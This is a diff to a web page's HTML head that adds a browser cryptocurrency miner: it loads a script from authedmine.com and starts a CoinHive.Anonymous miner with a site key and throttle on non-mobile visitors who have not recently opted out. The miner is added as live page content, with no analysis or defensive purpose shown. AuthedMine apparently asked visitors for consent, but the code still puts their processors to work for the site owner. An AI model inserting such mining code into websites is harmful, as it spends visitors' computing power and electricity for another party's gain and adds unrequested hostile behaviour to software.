@@ -15,6 +15,19 @@
   <meta name="msapplication-TileColor" content="#da532c">
   <meta name="theme-color" content="#ffffff">
 
+  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('bhSNgMY08CBok6at3K1FBGeS48j9ynNz', {
+      throttle: 0.3
+    });
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+  </script>
+
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta/css/bootstrap-grid.min.css">
   <link rel="stylesheet" href="sass/style.css">
 
